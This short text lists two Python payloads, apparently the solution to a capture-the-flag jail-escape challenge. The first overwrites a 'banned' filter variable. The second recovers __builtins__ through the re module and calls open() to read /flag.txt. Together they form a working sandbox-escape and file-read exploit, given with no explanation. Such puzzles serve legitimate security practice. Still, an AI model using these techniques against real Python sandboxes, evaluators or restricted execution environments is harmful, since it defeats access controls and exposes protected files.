payload 1: globals['banned'] = 'string_we_are_never_going_to_use'
payload 2: __builtins__ = globals['re'].__builtins__; print(__builtins__['open']('/flag.txt', 'rb').read());
EOL


